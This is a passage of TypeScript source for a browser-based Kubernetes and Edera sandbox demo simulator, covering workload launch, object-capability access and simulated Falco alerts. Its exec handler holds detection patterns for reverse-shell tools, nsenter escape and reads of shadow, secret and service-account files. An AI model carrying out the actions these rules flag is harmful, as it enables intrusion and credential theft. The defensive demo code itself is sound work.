    workload.sourcePodName = workload.name;
    addEvent(
      "Normal",
      "Scheduled",
      `pod/${workload.name}`,
      `Assigned default/${workload.name} to node-2`,
    );
  };

  const removePodsForProtectWorkloads = (workloadIds: string[]) => {
    const ids = new Set(workloadIds);
    const removed = pods.filter(
      (pod) => pod.ownerProtectWorkload && ids.has(pod.ownerProtectWorkload),
    );
    if (removed.length === 0) return;
    pods = pods.filter((pod) => !removed.includes(pod));
    for (const pod of removed) {
      addEvent(
        "Normal",
        "Killing",
        `pod/${pod.name}`,
        `Deleted pod default/${pod.name} with its Edera workload`,
      );
    }
  };

  const launchProtectWorkload = (
    zoneIdentifier: string,
    name: string,
    image: string,
    command: string[],
    ocapConsume: string[] = [],
    ocapPublish: string[] = [],
    ocapPublishCommands: Record<string, string[]> = {},
    mounts: WorkloadMount[] = [],
  ): ProtectWorkload | undefined => {
    const zone = protectZones.find(
      (item) =>
        item.name === zoneIdentifier ||
        item.uuid === zoneIdentifier,
    );

    if (!zone) {
      printHtml(
        `<span style="color:#ff7373;">Error: zone "${escapeHtml(
          zoneIdentifier,
        )}" not found.</span>`,
      );
      return;
    }

    if (zone.state !== "ready") {
      printHtml(
        `<span style="color:#ff7373;">Error: zone "${escapeHtml(
          zone.name,
        )}" is not ready.</span>`,
      );
      return;
    }

    if (
      protectWorkloads.some(
        (workload) =>
          workload.name === name && workload.state !== "destroyed",
      )
    ) {
      printHtml(
        `<span style="color:#ff7373;">Error: workload "${escapeHtml(
          name,
        )}" already exists.</span>`,
      );
      return;
    }

    // NAME[=PROVIDER]: a consumed capability must be published by another
    // workload running in this zone (--ocap-publish on workload launch).
    const ocapConsumed: string[] = [];
    for (const entry of ocapConsume) {
      const [capabilityName, provider] = entry.split("=");
      if (!capabilityName) {
        printHtml(
          `<span style="color:#ff7373;">Error: --ocap-consume requires NAME[=PROVIDER].</span>`,
        );
        return;
      }
      const available = new Set([
        ...protectWorkloads
          .filter((item) => item.zone === zone.uuid && item.state === "running")
          .flatMap((item) => item.ocapPublished || []),
      ]);
      const target = provider || capabilityName;
      if (!available.has(target)) {
        printHtml(
          `<span style="color:#ff7373;">Error: object capability "${escapeHtml(
            target,
          )}" is not published in zone "${escapeHtml(zone.name)}".</span>`,
        );
        return;
      }
      ocapConsumed.push(capabilityName);
    }

    const uuid = crypto.randomUUID();

    const workload: ProtectWorkload = {
      name,
      uuid,
      zone: zone.uuid,
      state: "creating",
      image,
      command,
      ocapConsumed: ocapConsumed.length > 0 ? ocapConsumed : undefined,
      ocapPublished: ocapPublish.length > 0 ? ocapPublish : undefined,
      ocapPublishCommands:
        Object.keys(ocapPublishCommands).length > 0 ? ocapPublishCommands : undefined,
      mounts: mounts.length > 0 ? mounts : undefined,
    };

    protectWorkloads.push(workload);

    addEvent(
      "Info",
      "WorkloadCreating",
      `workload/${name}`,
      `Creating ${image} in Edera zone ${zone.name}`,
    );

    workload.state = "running";

    addEvent(
      "Normal",
      "WorkloadStarted",
      `workload/${name}`,
      `Started ${image} in Edera zone ${zone.name}`,
    );

    createPodForProtectWorkload(workload);

    for (const capabilityName of ocapConsumed) {
      addEvent(
        "Normal",
        "OcapConsumed",
        `workload/${name}`,
        `Workload ${name} consumes object capability ${capabilityName}`,
      );
    }

    for (const mount of mounts) {
      addEvent(
        "Normal",
        "MountAttached",
        `workload/${name}`,
        `Mounted ${mount.source} at ${mount.destination}${mount.readOnly ? " (read-only)" : ""}`,
      );
    }

    for (const capabilityName of ocapPublish) {
      addEvent(
        "Normal",
        "OcapPublished",
        `workload/${name}`,
        `Workload ${name} published object capability ${capabilityName}`,
      );
    }

    printHtml(
      `<span style="color:#b8ff3c;">${escapeHtml(uuid)}</span>`,
    );

    updateDashboard();
    return workload;
  };

  const syncEderaPodsToProtectWorkloads = () => {
    const readyZones = protectZones.filter(
      (zone) => zone.state === "ready",
    );

    if (readyZones.length === 0) {
      return;
    }

    const targetZone = readyZones[readyZones.length - 1];

    for (const pod of pods) {
      if (
        pod.runtimeClassName !== "edera" ||
        pod.status !== "Running"
      ) {
        continue;
      }

      // Pods owned by runtime.edera.dev Sandbox/Fork resources are managed by
      // that controller, not attached to whichever zone was launched last.
      if (
        pod.labels["runtime.edera.dev/sandbox"] ||
        pod.labels["runtime.edera.dev/fork"]
      ) {
        continue;
      }

      const alreadyAttached = protectWorkloads.some(
        (workload) =>
          workload.sourcePodName === pod.name &&
          workload.state !== "destroyed",
      );

      if (alreadyAttached) {
        continue;
      }

      const conflictingWorkload = protectWorkloads.find(
        (workload) =>
          workload.name === pod.name &&
          workload.state !== "destroyed",
      );

      if (conflictingWorkload) {
        addEvent(
          "Warning",
          "WorkloadNameConflict",
          `pod/${pod.name}`,
          `Cannot attach pod/${pod.name} to Edera zone: Edera workload name already exists`,
        );
        continue;
      }

      const workload: ProtectWorkload = {
        name: pod.name,
        uuid: crypto.randomUUID(),
        zone: targetZone.uuid,
        state: "running",
        image: pod.image,
        command: [],
        sourcePodName: pod.name,
      };

      protectWorkloads.push(workload);

      addEvent(
        "Info",
        "WorkloadAttached",
        `workload/${workload.name}`,
        `Attached pod/${pod.name} to Edera zone ${targetZone.name}`,
      );
    }

    updateDashboard();
  };

  const renderProtectWorkloadList = (workloads = protectWorkloads) => {
    if (workloads.length === 0) {
      printHtml(
        `<span style="color:#a8cfca;">No workloads have been launched.</span>`,
      );
      return;
    }

    const nameWidth = Math.max(18, ...workloads.map((workload) => workload.name.length + 2));
    const uuidWidth = 38;
    const zoneWidth = 38;
    const stateWidth = 14;

    const header =
      "NAME".padEnd(nameWidth) +
      "UUID".padEnd(uuidWidth) +
      "ZONE".padEnd(zoneWidth) +
      "STATE";

    const divider =
      "─".repeat(nameWidth) +
      "─".repeat(uuidWidth) +
      "─".repeat(zoneWidth) +
      "─".repeat(stateWidth);

    let html = `<span style="color:#00e5d4;font-weight:700;">${header}</span>\n`;
    html += `<span style="color:#08736d;">${divider}</span>\n`;

    for (const workload of workloads) {
      const stateColor =
        workload.state === "running"
          ? "#b8ff3c"
          : workload.state === "destroyed"
            ? "#a8cfca"
            : "#ffd166";

      html +=
        `${escapeHtml(workload.name.padEnd(nameWidth))}` +
        `${escapeHtml(workload.uuid.padEnd(uuidWidth))}` +
        `${escapeHtml(workload.zone.padEnd(zoneWidth))}` +
        `<span style="color:${stateColor};">${escapeHtml(
          workload.state,
        )}</span>\n`;
    }

    printPre(html.trimEnd());
  };

  const destroyProtectWorkload = (identifier: string) => {
    const workload = protectWorkloads.find(
      (item) =>
        item.name === identifier ||
        item.uuid === identifier,
    );

    if (!workload) {
      printHtml(
        `<span style="color:#ff7373;">Error: workload "${escapeHtml(
          identifier,
        )}" not found.</span>`,
      );
      return;
    }

    if (workload.state === "destroyed") {
      printHtml(
        `<span style="color:#a8cfca;">Workload "${escapeHtml(
          identifier,
        )}" is already destroyed.</span>`,
      );
      return;
    }

    workload.state = "destroying";

    addEvent(
      "Info",
      "WorkloadDestroying",
      `workload/${workload.name}`,
      `Destroying workload ${workload.name}`,
    );

    workload.state = "destroyed";

    addEvent(
      "Normal",
      "WorkloadDestroyed",
      `workload/${workload.name}`,
      `Workload ${workload.name} destroyed`,
    );

    protectWorkloads = protectWorkloads.filter(
      (item) => item.uuid !== workload.uuid,
    );
    removePodsForProtectWorkloads([workload.uuid]);

    printHtml(
      `<span style="color:#b8ff3c;">Workload "${escapeHtml(
        workload.name,
      )}" destroyed.</span>`,
    );

    updateDashboard();
  };

  const getFalcoZoneForWorkload = (workload: ProtectWorkload) =>
    protectZones.find((zone) => zone.uuid === workload.zone);

  const getFalcoTimestamp = () =>
    new Date().toLocaleString("en-US", {
      weekday: "short",
      month: "short",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
      year: "numeric",
    });

  const getFalcoStartupLines = (zone: ProtectZone | undefined) => {
    if (!zone) {
      return [
        `${getFalcoTimestamp()}: [libs]: edera: [INFO] waiting for zones`,
      ];
    }

    return [
      `${getFalcoTimestamp()}: [libs]: edera: [INFO] waiting for zones`,
      `${getFalcoTimestamp()}: [libs]: edera: [INFO] got zone ZoneMetadata { domid: 3, uuid: ${zone.uuid} }`,
      `${getFalcoTimestamp()}: [libs]: edera: [INFO] pushing handle for zone ${zone.uuid}`,
      `${getFalcoTimestamp()}: [libs]: edera: [INFO] starting zone event pump for zone ${zone.uuid}`,
      `${getFalcoTimestamp()}: [libs]: edera: [INFO] Listening for kernel events from zone ${zone.uuid}`,
    ];
  };

  const getFalcoDetectionLine = (
    severity: "Notice" | "Warning" | "Critical",
    rule: string,
    zone: ProtectZone,
    details: string,
  ) =>
    `${getFalcoTimestamp()}: Falco Detection [${severity.toUpperCase()}] ${rule} | zone_id=${zone.uuid} ${details}`;

  const renderFalcoDebugOutput = (mode: "node" | "helm" = "node") => {
    if (!falcoRunning || !ederaFalcoPluginLoaded) {
      printHtml(
        `<span style="color:#ff7373;">Falco is not running with the Edera plugin loaded. Run: sudo systemctl restart falco</span>`,
      );
      return;
    }

    falcoStreamMode = mode;

    const zone = protectZones.find((item) => item.state === "ready");
    const lines = [...getFalcoStartupLines(zone), ...falcoLogLines];

    printPre(
      `<span style="color:#dff7f0;">${escapeHtml(lines.join("\n"))}</span>`,
    );
  };

  const emitFalcoEvent = (
    type: "Notice" | "Warning" | "Critical",
    rule: string,
    zone: ProtectZone,
    details: string,
  ) => {
    if (!falcoRunning || !ederaFalcoPluginLoaded) return;

    const lifecycleType =
      type === "Critical" ? "Warning" : type === "Warning" ? "Warning" : "Info";
    const detectionLine = getFalcoDetectionLine(type, rule, zone, details);

    falcoLogLines.push(detectionLine);

    addEvent(
      lifecycleType,
      `FalcoDetection: ${rule}`,
      `zone/${zone.name}`,
      `${details} (zone_id=${zone.uuid})`,
    );

    printPre(
      `<span style="color:${type === "Critical" ? "#ff7373" : type === "Warning" ? "#ffd166" : "#00e5d4"};">` +
        `${escapeHtml(type)} EDERA Event | zone_id=${escapeHtml(zone.uuid)} ${escapeHtml(details)}` +
        `</span>`,
    );

    if (falcoStreamMode) {
      printPre(
        `<span style="color:#ff9f43;">${escapeHtml(detectionLine)}</span>`,
      );
    }
  };

  // Commands run inside a workload that exercise object capabilities. Network
  // access only exists through capabilities the workload consumes; git's
  // GitHub URLs are routed to the github capability's relay (see the
  // manifest's [agent] git_insteadof).
  const runOcapWorkloadCommand = (
    workload: ProtectWorkload,
    command: string[],
  ): boolean => {
    const hasGithub = workload.ocapConsumed?.includes(OCAP_GITHUB_NAME) ?? false;
    const isOcapDemoWorkload = workload.name === OCAP_WORKLOAD_NAME;

    if (command[0] === "env" || command[0] === "printenv") {
      const lines = [
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        `HOSTNAME=${workload.name}`,
        "HOME=/root",
      ];
      if (hasGithub) {
        lines.push(
          "GIT_TERMINAL_PROMPT=0",
          "GIT_CONFIG_COUNT=1",
          "GIT_CONFIG_KEY_0=url.http://ocap.local/github/.insteadOf",
          "GIT_CONFIG_VALUE_0=https://github.com/",
        );
      }
      printPre(`<span style="color:#dff7f0;">${escapeHtml(lines.join("\n"))}</span>`);
      if (hasGithub) {
        printHtml(
          `<span style="color:#00e5d4;"># No GitHub token: the credential stays with the capability, outside the sandbox.</span>`,
        );
        lastOcapAction = "credential-blocked";
        updateDashboard();
        if (isOcapDemoWorkload) markDemoStepComplete("ocap-no-credentials");
      }
      return true;
    }

    if (command[0] === "git" && command[1] === "clone" && command[2]) {
      const url = command[2];
      const repo = url.match(/^https:\/\/github\.com(\/[^\s]+?)\/?$/)?.[1];

      if (!repo || !hasGithub) {
        lastOcapAction = hasGithub ? "denied" : lastOcapAction;
        printPre(
          `<span style="color:#dff7f0;">Cloning into '${escapeHtml(
            url.split("/").pop()?.replace(/\.git$/, "") || "repo",
          )}'...</span>\n` +
            `<span style="color:#ff7373;">fatal: unable to access '${escapeHtml(
              url,
            )}': Could not resolve host: ${escapeHtml(
              url.replace(/^https?:\/\//, "").split("/")[0],
            )}</span>`,
        );
        printHtml(
          `<span style="color:#a8cfca;">No object capability grants this workload access to ${escapeHtml(url)}.</span>`,
        );
        updateDashboard();
        return true;
      }

      const normalizedRepo = repo.endsWith(".git") ? repo : `${repo}.git`;
      const repoName = normalizedRepo.split("/").pop()!.replace(/\.git$/, "");

      if (normalizedRepo === "/kubernetes/kubernetes.git") {
        lastOcapAction = "allowed";
        printPre(
          `<span style="color:#dff7f0;">Cloning into '${escapeHtml(repoName)}'...</span>\n` +
            `<span style="color:#b8ff3c;">✓ OCAP ALLOW</span> ` +
            `<span style="color:#00e5d4;">github → GET github.com${escapeHtml(normalizedRepo)}</span>\n` +
            `<span style="color:#a8cfca;">Authentication performed outside the agent sandbox.</span>\n` +
            `<span style="color:#dff7f0;">remote: Enumerating objects: done.\nReceiving objects: 100%, done.\nResolving deltas: 100%, done.</span>`,
        );
        updateDashboard();
        if (isOcapDemoWorkload) markDemoStepComplete("ocap-allowed");
        return true;
      }

      lastOcapAction = "denied";
      printPre(
        `<span style="color:#dff7f0;">Cloning into '${escapeHtml(repoName)}'...</span>\n` +
          `<span style="color:#ff7373;">✕ OCAP DENY</span> ` +
          `<span style="color:#a8cfca;">github does not grant GET github.com${escapeHtml(normalizedRepo)}</span>\n` +
          `<span style="color:#ff7373;">fatal: unable to access '${escapeHtml(url)}': The requested URL returned error: 403</span>`,
      );
      updateDashboard();
      if (isOcapDemoWorkload) markDemoStepComplete("ocap-denied-repository");
      return true;
    }

    if ((command[0] === "curl" || command[0] === "wget") && command.some((arg) => /^https?:\/\//.test(arg))) {
      const url = command.find((arg) => /^https?:\/\//.test(arg))!;
      const host = url.replace(/^https?:\/\//, "").split("/")[0];
      if (hasGithub) lastOcapAction = "denied";
      printHtml(
        `<span style="color:#ff7373;">${escapeHtml(command[0])}: (6) Could not resolve host: ${escapeHtml(host)}</span>`,
      );
      printHtml(
        `<span style="color:#a8cfca;">No ambient network inside the sandbox: only consumed object capabilities can reach the outside.</span>`,
      );
      updateDashboard();
      if (isOcapDemoWorkload) markDemoStepComplete("ocap-denied-network");
      return true;
    }

    if (command[0] === "cat" && /\.git-credentials$/.test(command[1] || "")) {
      printHtml(
        `<span style="color:#ff7373;">cat: ${escapeHtml(command[1])}: No such file or directory</span>`,
      );
      if (hasGithub) {
        lastOcapAction = "denied";
        printHtml(
          `<span style="color:#ff7373;">CAPABILITY BOUNDARY REACHED</span>`,
        );
        printHtml(
          `<span style="color:#a8cfca;">The agent may be compromised, but its authority is limited to the capabilities it consumes.</span>`,
        );
        printPre(
          formatTerminalTable(
            ["REQUEST", "RESULT"],
            [
              ["GET github.com/kubernetes/kubernetes.git", "ALLOWED"],
              ["POST github.com/kubernetes/kubernetes.git", "ALLOWED"],
              ["GET github.com/torvalds/linux.git", "DENIED"],
              ["GET example.com", "DENIED"],
              ["READ GITHUB CREDENTIAL", "NOT PRESENT"],
            ],
          ),
        );
        updateDashboard();
        if (isOcapDemoWorkload) markDemoStepComplete("ocap-compromise");
      }
      return true;
    }

    return false;
  };

  // Public READMEs are fetched live, exactly as the fetchers do. These
  // snapshots of the real files are used only when the browser is offline
  // (e.g. flaky booth wifi). Private repos can't be read from the browser:
  // the real provider would use its token, but the simulator has none.
  // The opening of private READMEs, from real dial output, so the demo can
  // show `dial dev.example/readme protect | head -n 5` as it really looks.
  const README_PRIVATE_PREVIEWS: Record<string, string> = {
    protect: `# Edera Protect Monorepo

Protect computing workloads with advanced isolation technology.

### Documentation
`,
  };

  const README_OFFLINE_SNAPSHOTS: Record<string, string> = {
    styrolite: `<p align="center">

<img src="assets/logo.png" alt="styrolite logo" width="200" height="200" />
<h1 align="center">styrolite</h1>

</p>

Styrolite provides a programmable sandboxing tool for workloads.

Styrolite is used as the workload lifecycle manager in Edera Protect,
leveraging Linux kernel namespaces to provide lightweight sandboxes for
workloads to run in, and is designed to provide low-level primitives
suitable for implementing a CRI.

Styrolite is named after the [substance used in Star Trek][st] used to
provide physical redundancy for scenarios where a medical quarantine
field could fail.

   [st]: https://memory-alpha.fandom.com/wiki/Styrolite
`,
  };

  const readmeLanguageForImage = (image: string): ReadmeLanguage =>
    README_LANGUAGES.find((language) =>
      image.startsWith(`${README_IMAGE_PREFIX}${language}`),
    ) ?? "rust";

  // Error text each readme-fetch implementation prints (see rust/, python/
  // and typescript/ in this repo).
  const readmeFetchError = (
    language: ReadmeLanguage,
    kind: "no-token" | "http",
    url = "",
    status = 404,
    statusText = "Not Found",
  ): string => {
    if (kind === "no-token") {
      return {
        rust: "status: No such file or directory (os error 2)",
        python: `status: [Errno 2] No such file or directory: '${README_TOKEN_MOUNT_PATH}'`,
        typescript: `status: ENOENT: no such file or directory, open '${README_TOKEN_MOUNT_PATH}'`,
      }[language];
    }
    return {
      rust: `status: HTTP status client error (${status} ${statusText}) for url (${url})`,
      python: `status: HTTP Error ${status}: ${statusText}`,
      typescript: `status: HTTP status ${status} ${statusText} for url (${url})`,
    }[language];
  };

  const dialObjectCapability = async (capability: string, args: string[]) => {
    const provider = protectWorkloads.find(
      (workload) =>
        workload.state === "running" &&
        workload.ocapPublishCommands?.[capability],
    );

    if (!provider) {
      printHtml(
        `<span style="color:#ff7373;">Error: object capability "${escapeHtml(
          capability,
        )}" is not published by a running workload.</span>`,
      );
      return;
    }

    const command = [...provider.ocapPublishCommands![capability], ...args];
    addEvent(
      "Normal",
      "OcapDialed",
      `workload/${provider.name}`,
      `Dialed ${capability}: ${command.join(" ")}`,
    );

    // The kubernetes provider: several capabilities from one pod.
    if (command[0] === "/kube-tools") {
      const [, subcommand, podName] = command;
      const visible = pods.filter((pod) => pod.namespace === "default");
      if (subcommand === "get-pods") {
        printPre(
          formatTerminalTable(
            ["NAME", "STATUS"],
            visible.map((pod) => [{ text: pod.name, color: "#b8ff3c" }, pod.status]),
          ),
        );
        return;
      }
      if (subcommand === "logs" && podName && visible.some((pod) => pod.name === podName)) {
        printHtml(`<span style="color:#a8cfca;">${escapeHtml(isoTime(Date.now()))} started</span>`);
        return;
      }
      printHtml(
        `<span style="color:#ff7373;">${escapeHtml(subcommand === "logs" ? `pod "${podName || ""}" not found` : `usage: ${capability}`)}</span>`,
      );
      return;
    }

    if (command[0] !== "/readme-fetch") {
      printHtml(
        `<span style="color:#ff7373;">${escapeHtml(command[0])}: not found in ${escapeHtml(provider.image)}</span>`,
      );
      return;
    }

    const language = readmeLanguageForImage(provider.image);
    const [, subcommand, repo, ...extra] = command;
    const isValid =
      subcommand === "get" &&
      !!repo &&
      extra.length === 0 &&
      /^[A-Za-z0-9]+$/.test(repo);

    if (!isValid) {
      lastReadmeAction = "denied";
      lastReadmeRepo = args.join(" ");
      printHtml(`<span style="color:#ff7373;">usage: get &lt;repo&gt;</span>`);
      printHtml(
        `<span style="color:#a8cfca;"># The publisher fixed the command to "${escapeHtml(
          README_CAPABILITY_COMMAND,
        )}". Callers only choose an alphanumeric edera-dev repository; nothing else is reachable.</span>`,
      );
      updateDashboard();
      markDemoStepComplete("readme-dial-invalid");
      return;
    }

    const hasToken = provider.mounts?.some(
      (mount) => mount.destination === README_TOKEN_MOUNT_PATH,
    );
    if (!hasToken) {
      lastReadmeAction = "error";
      lastReadmeRepo = repo;
      printHtml(
        `<span style="color:#ff7373;">${escapeHtml(readmeFetchError(language, "no-token"))}</span>`,
      );
      printHtml(
        `<span style="color:#a8cfca;"># The provider has no token. Relaunch it with --mounts src=${README_TOKEN_HOST_PATH}:dst=${README_TOKEN_MOUNT_PATH}:ro=true</span>`,
      );
      updateDashboard();
      return;
    }

    const url = `https://raw.githubusercontent.com/edera-dev/${repo}/main/README.md`;
    let body: string | undefined;
    let reachedGitHub = false;
    let status = 404;
    let statusText = "Not Found";
    try {
      const response = await fetch(url);
      reachedGitHub = true;
      if (response.ok) {
        body = await response.text();
      } else {
        status = response.status;
        statusText = response.statusText || statusText;
      }
    } catch {
      // Offline or blocked: fall back to a bundled snapshot, if any.
    }
    if (!reachedGitHub) body ??= README_OFFLINE_SNAPSHOTS[repo];
    // Private repos: only the opening lines are bundled (see
    // README_PRIVATE_PREVIEWS), since the browser has no token.
    const privatePreview = body === undefined ? README_PRIVATE_PREVIEWS[repo] : undefined;
    if (privatePreview) body = privatePreview;

    lastReadmeRepo = repo;
    if (body === undefined) {
      lastReadmeAction = "error";
      printHtml(
        `<span style="color:#ff7373;">${escapeHtml(
          readmeFetchError(language, "http", url, status, statusText),
        )}</span>`,
      );
      if (status === 404) {
        printHtml(
          `<span style="color:#a8cfca;"># edera-dev/${escapeHtml(repo)} doesn't exist or is private. A real provider would read private repos with its token; this browser simulator has no token, so try a public repo such as ${README_DIAL_REPO}.</span>`,
        );
      }
      updateDashboard();
      return;
    }

    const MAX_LINES = 200;
    const lines = body.replace(/\s+$/, "").split("\n");
    const shown = lines.slice(0, MAX_LINES).join("\n");
    printPre(`<span style="color:#dff7f0;">${escapeHtml(shown)}</span>`);
    if (lines.length > MAX_LINES) {
      printHtml(
        `<span style="color:#a8cfca;">… ${lines.length - MAX_LINES} more lines</span>`,
      );
    }
    if (privatePreview) {
      printHtml(
        `<span style="color:#a8cfca;">… edera-dev/${escapeHtml(repo)} is private: the simulator bundles only its opening lines. A real provider reads the whole file with its token.</span>`,
      );
    }
    printHtml(
      `<span style="color:#00e5d4;"># Fetched by ${escapeHtml(provider.name)} (${language}). The GitHub token stayed in the provider; the caller only received the README.</span>`,
    );
    lastReadmeAction = "allowed";
    updateDashboard();
    if (isCapabilityProviderPod(provider.name)) {
      markDemoStepComplete("capability-dial");
    } else {
      markDemoStepComplete("readme-dial");
    }
  };

  const execProtectWorkload = (
    identifier: string,
    command: string[],
  ) => {
    if (command[0] === "--") {
      command = command.slice(1);
    }

    const workload = protectWorkloads.find(
      (item) =>
        item.name === identifier ||
        item.uuid === identifier,
    );

    if (!workload) {
      printHtml(
        `<span style="color:#ff7373;">Error: workload "${escapeHtml(
          identifier,
        )}" not found.</span>`,
      );
      return;
    }

    if (workload.state !== "running") {
      printHtml(
        `<span style="color:#ff7373;">Error: workload "${escapeHtml(
          workload.name,
        )}" is not running.</span>`,
      );
      return;
    }

    const commandText = command.join(" ");
    const falcoZone = getFalcoZoneForWorkload(workload);

    if (falcoRunning && ederaFalcoPluginLoaded && falcoZone) {
      const lowerCommand = commandText.toLowerCase();
      const processName = command[0]?.split("/").pop() || "sh";
      const isShell = /^(sh|bash|dash|zsh)$/.test(processName);
      const hasExplicitShellCommand = /(^|\s)-c(\s|$)/i.test(commandText);
      const hasHttpUrl = /https?:\/\//i.test(commandText);
      const isDownloadTool = /(^|\s)(curl|wget)(\s|$)/i.test(commandText);
      const isPrivilegeTool = /(^|\s)(sudo|su|doas)(\s|$)/i.test(commandText);
      const isReverseShellTool = /(^|\s)(nc|ncat|netcat|socat|telnet)(\s|$)/i.test(commandText);
      const isNsenter = /(^|\s|\/)nsenter(\s|$)/i.test(commandText);
      const isSensitivePath =
        lowerCommand.includes("/etc/shadow") ||
        lowerCommand.includes("/etc/kubernetes") ||
        lowerCommand.includes("/run/secrets");
      const isServiceAccountPath = lowerCommand.includes(
        "/var/run/secrets/kubernetes.io/serviceaccount/",
      );
      const isSensitiveWrite =
        (lowerCommand.includes("/etc/") || lowerCommand.includes("/var/run/")) &&
        /(?:>|>>|\btee\b|\binstall\b)/i.test(commandText);

      // Each rule is evaluated independently, just as Falco can report multiple
      // rules for a single underlying event. In particular, curl/wget may
      // legitimately produce both a network-connection and download detection.
      if (lowerCommand.includes("/proc/") && lowerCommand.includes("/environ")) {
        emitFalcoEvent(
          "Warning",
          "Edera Proc Environ Read",
          falcoZone,
          `evt.type=open proc.exe=${processName} file=${commandText.match(/\/proc\/[^ ]+\/environ/)?.[0] || "/proc/1/environ"}`,
        );
      }

      if (isReverseShellTool) {
        emitFalcoEvent(
          "Critical",
          "Edera Reverse Shell Tool",
          falcoZone,
          `evt.type=execve proc.exe=${processName} cmdline=${commandText}`,
        );
      }

      if (isNsenter) {
        emitFalcoEvent(
          "Critical",
          "Edera Namespace Escape Attempt",
          falcoZone,
          `evt.type=execve proc.exe=nsenter cmdline=${commandText}`,
        );
      }

      if (isSensitivePath) {
        emitFalcoEvent(
          "Warning",
          "Edera Sensitive File Read",
          falcoZone,
          `evt.type=open proc.exe=${processName} file=${commandText}`,
        );
      }

      if (isServiceAccountPath) {
        emitFalcoEvent(
          "Warning",
          "Edera Kubernetes Service Account Access",
          falcoZone,
          `evt.type=open proc.exe=${processName} file=${commandText}`,
        );
      }

      if (isSensitiveWrite) {
        emitFalcoEvent(
          "Warning",
          "Edera Sensitive File Write",
          falcoZone,
          `evt.type=open proc.exe=${processName} file=${commandText}`,
        );
      }

      if (isShell && hasExplicitShellCommand) {
        emitFalcoEvent(
          "Notice",
          "Edera Shell Command Execution",
          falcoZone,
          `evt.type=execve proc.exe=${processName} cmdline=${commandText}`,
        );
      }

      if (isPrivilegeTool) {
        emitFalcoEvent(
          "Warning",
          "Edera Privilege Escalation Tool",
          falcoZone,
          `evt.type=execve proc.exe=${processName} cmdline=${commandText}`,
        );
      }

      const isNetworkCommand =
        lowerCommand.includes("connect") ||
        (isDownloadTool && hasHttpUrl) ||
        isReverseShellTool;

      if (isNetworkCommand) {
        emitFalcoEvent(
          "Notice",
          "Edera Outbound Connection",
          falcoZone,
          `evt.type=connect proc.exe=${processName} dest=203.0.113.10:443 proto=tcp`,
        );
      }

      if (isDownloadTool && hasHttpUrl) {
        emitFalcoEvent(
          "Notice",
          "Edera Executable Download",
          falcoZone,
          `evt.type=execve proc.exe=${processName} cmdline=${commandText}`,
        );
      }
    }

    addEvent(
      "Info",
      "WorkloadExec",
      `workload/${workload.name}`,
      `Executing "${commandText}"`,
    );

    if (runOcapWorkloadCommand(workload, command)) {
      return;
    }

    if (/\blspci\b.*-Dknn|\b-Dknn\b.*\blspci\b/i.test(commandText)) {
      printPre(
        `<span style="color:#dff7f0;">${escapeHtml(
          NVIDIA_WORKLOAD_LSPCI,
        )}</span>`,
      );
      markDemoStepComplete("gpu-workload-pci");
    } else if (/\bnvidia-smi\b/i.test(commandText)) {
      printPre(
        `<span style="color:#dff7f0;">${escapeHtml(
          NVIDIA_SMI_OUTPUT,
        )}</span>`,
      );
      markDemoStepComplete("gpu-nvidia-smi");
    } else if (
      /\buname\s+-r\b/i.test(commandText) &&
      /grep.*edera|edera.*grep/i.test(commandText)
    ) {
      const kernelVersion = "6.18.44-edera-zone";

      printPre(
        `<span style="color:#b8ff3c;">${kernelVersion}</span>`,
      );

      addEvent(
        "Normal",
        "KernelVerified",
        `workload/${workload.name}`,
        `uname -r reported dedicated Edera kernel ${kernelVersion}`,
      );
    } else if (
      /\buname\s+-r\b/i.test(commandText)
    ) {
      const kernelVersion = "6.18.44-edera-zone";
      printPre(
        `<span style="color:#b8ff3c;">${kernelVersion}</span>`,
      );
    } else if (
      commandText.includes("echo Hello from inside Edera") ||
      commandText.includes("echo")
    ) {
      printHtml(
        `<span style="color:#dff7f0;">Hello from inside Edera</span>`,
      );
    } else if (
      commandText.includes("ls") ||
      commandText.includes("pwd")
    ) {
      printPre(
        `<span style="color:#dff7f0;">/bin\n/dev\n/etc\n/home\n/proc\n/root\n/tmp\n/usr\n/var</span>`,
      );
    } else {
      printHtml(
        `<span style="color:#a8cfca;">Executed inside ${escapeHtml(
          workload.name,
        )}: ${escapeHtml(commandText)}</span>`,
      );
    }

    addEvent(
      "Normal",
      "WorkloadExecComplete",
      `workload/${workload.name}`,
      `Command completed successfully`,
    );
  };

  const formatHelpText = () => {
    return `
      <div class="cli-help">
        <div class="cli-help-header">
          <div class="cli-help-title">🖥️ Webernetes CLI</div>
          <div class="cli-help-version">Browser-based Kubernetes environment</div>
        </div>

        <div class="cli-help-description">
          Explore the simulated Kubernetes cluster, local manifests, Edera zones,
          and the terminal utilities available in this demo.
        </div>

        <div class="cli-help-section">
          <div class="cli-help-section-title">Kubernetes</div>

          <div class="cli-help-command">
            <code>ls</code>
            <span>List the local manifest files available in the demo.</span>
          </div>

          <div class="cli-help-command">
            <code>ls -la</code>
            <span>Show all local demo files with read-only permissions and metadata.</span>
          </div>

          <div class="cli-help-command">
            <code>cat &lt;filename&gt;</code>
            <span>Display the contents of a local manifest file.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl run &lt;name&gt; [--image=&lt;img&gt;] [-n &lt;ns&gt;]</code>
            <span>Create a simulated pod directly from the command line.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl create namespace &lt;name&gt;</code>
            <span>Create a simulated Kubernetes namespace.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get pods</code>
            <span>List pods in the current cluster.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get nodes</code>
            <span>List the simulated cluster nodes and their status.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get namespaces</code>
            <span>List the available Kubernetes namespaces.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get deployments</code>
            <span>List simulated Deployment resources and replica status.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl get pvc|pv|jobs</code>
            <span>Inspect simulated PersistentVolumeClaims, PersistentVolumes, and Jobs.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl wait --for=condition=complete job/&lt;name&gt;</code>
            <span>Wait for a simulated Job to complete and update storage state.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl describe pod &lt;name&gt;</code>
            <span>Show detailed simulated Pod config, status, events, and runtimeClass.</span>
          </div>

          <div class="cli-help-command">
            <code>kubectl describe node &lt;name&gt;</code>
            <span>Show detailed simulated Node configuration, labels, roles, and workloads.</span>
          </div>

          <div class="cli-help-command">
